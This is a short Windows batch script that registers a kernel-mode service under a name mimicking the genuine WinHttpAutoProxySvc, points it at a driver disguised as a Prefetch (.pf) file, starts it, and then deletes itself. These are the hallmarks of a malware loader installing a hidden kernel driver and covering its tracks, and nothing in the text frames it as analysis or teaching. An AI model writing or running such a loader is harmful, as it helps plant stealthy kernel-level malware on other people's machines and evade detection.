@echo off
cd %~dp0
sc create WinHttpAutoProxySvc59_c binpath=C:\Windows\Prefetch\CMD.EXE-YUW473J3.pf type=kernel
sc start WinHttpAutoProxySvc59_c
del "%~f0"